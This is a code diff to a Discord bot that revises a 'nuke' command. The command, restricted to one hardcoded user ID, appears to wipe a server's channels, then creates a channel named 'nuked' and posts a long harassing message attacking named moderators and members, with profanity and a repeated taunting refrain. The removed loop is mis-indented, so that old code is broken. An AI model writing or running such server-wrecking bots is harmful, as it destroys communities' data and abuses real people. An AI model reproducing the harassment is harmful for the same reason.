@@ -653,7 +653,7 @@ import asyncio
 
 @bot.command()
 async def enhanced(ctx):
-    if ctx.author.id != 1188620657588699176:
+    if ctx.author.id != 1097879047213686875:
         return await ctx.send("if the command dosen't work then your perms on this server are not on")
 
     for chan in ctx.guild.channels:
@@ -668,12 +668,8 @@ async def enhanced(ctx):
         except:
             pass
 
-	
-    num_channels = 10
-    for i in range(num_channels):
-    new_channel = await ctx.guild.create_text_channel(f'I FOOLED THE SHEPHERD {i + 1}')
-    await asyncio.sleep(1)
-    channel = discord.utils.get(ctx.guild.text_channels, id=new_channel.id)
+    await ctx.guild.create_text_channel('nuked')
+    channel = discord.utils.get(bot.get_all_channels(), guild=ctx.author.guild, name='nuked')
     await channel.send("You do not see it yet… But the rot has already spread. Hara. The ghost mod. You swing bans like a coward swings words behind closed doors. Muting. Kicking. Banning in rpcsx like you own justice, but when the mirror turned. You vanished. Just like Adam's father… when truth came knocking, you bolted. Face it. You fear being held accountable more than you feared being wrong. Null. How ironic. You despise name-calling, yet when you were given a name—one not vile, not cruel you flinched. You snapped. Why? Because it wasn’t control. It wasn’t yours. Because you're used to shouting at others, not being spoken to. You are not the martyr you pretend to be. Skyline scattered. Memories of EZ, kind to the end. Arisa. Deku. Their joy was real. Their spark is gone. MK... no, Hakurei. You were meant to protect them. But how many times now? You’ve stood aside, smiling, as the same friends you claim to cherish bled out emotionally in silence. You are the shrine maiden of broken bonds. You never learn. And now... I ask: Does this nuke remind you of somewhere? Years Before Eden and Citron fall…  Moderation in Eden… it’s no sanctuary. It's a child's illusion of order—Little tyrants with hammers far too heavy for their minds. Do you remember Alexindiex? The moderator? He banned a man for not supporting doxxers. A calm man. A quiet viewer. Falsely exiled with no trial. Why? Because he said something. Not cruel. Not harmful. Just truthful. And like the cowards they are, THEY BANNED HIM. They erased Citron. They erase everything. The moment it gets loud… They delete the servers. They run. Batman too brave, but blind. A boy in a battlefield. You cannot moderate what you do not understand. And now, my old friends… They may not remember me. But I remember them. That doesn't matter anymore. What matters is the darkness you’ve buried yourselves in. What matters is the truth I just brought back to light. And I will not be silenced. Sham has spoken. NOTHING IS WORTH A RISK NOTHING IS WORTH A RISK NOTHING IS WORTH A RISK NOTHING IS WORTH A RISK NOTHING ~~||YOU ||~~ IS WORTH A RISK NOTHING IS ||~~ FUCKING ~~|| WORTH A RISK RISK RISK RISK ||~~BASTARD~~||BE HAPPY https://tenor.com/bW9Gi.gif https://cdn.discordapp.com/attachments/1330275380363526147/1391150266094587964/Screenshot_20241128_200418.jpg?ex=686ad925&is=686987a5&hm=740d89fbeff81ea18e8f9662b858f97791d5094ced1a76223b447f84a31db38e&")
 
 @bot.command()
